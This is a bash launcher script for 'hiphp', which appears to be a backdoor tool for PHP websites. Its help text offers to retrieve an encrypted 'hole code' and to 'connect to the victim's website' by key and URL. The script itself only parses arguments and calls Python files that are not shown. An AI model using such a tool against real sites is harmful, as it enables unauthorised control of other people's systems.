#!/bin/bash
#   |                                                         |   #
# --+---------------------------------------------------------+-- #
#   |    Code by: yasserbdj96                                 |   #
#   |    Email: yasser.bdj96@gmail.com                        |   #
#   |    GitHub: github.com/yasserbdj96                       |   #
#   |    Sponsor: github.com/sponsors/yasserbdj96             |   #
#   |    BTC: bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9      |   #
#   |                                                         |   #
#   |    All posts with #yasserbdj96                          |   #
#   |    All views are my own.                                |   #
# --+---------------------------------------------------------+-- #
#   |                                                         |   #

#START{
#help:
if [ -z "$1" ]; then
    python3 "${PREFIX}/share/hiphp/hiphplogo.py" "ok_view";
    echo "Usage: hiphp [OPTION]";
    echo "";
    echo "Examples:";
    echo "         hiphp --help                  # Show CLI help for hiphp.";
    echo "         hiphp --geth [KEY] [URL]      # Retrieve the HIPHP_HOLE_CODE encrypted by your [KEY].";
    echo "         hiphp [KEY] [URL]             # Connect to the victim's website in CLI mode.";
    echo "         hiphp --version               # Check the current version number.";

#cli help:
elif [ "$1" == "--HELP" ] ; then
    python3 "${PREFIX}/share/hiphp.py" --HELP;

#version:
elif [ "$1" == "--VERSION" ] ; then
    python3 "${PREFIX}/share/hiphp.py" --VERSION;

#cli:
else
    if [ "$1" == "--GETH" ] ; then
        python3 "${PREFIX}/share/hiphp.py" --GETH --KEY=$2 --URL=$3;
    else
        python3 "${PREFIX}/share/hiphp.py" --KEY=$1 --URL=$2;
    fi
fi
#}END.
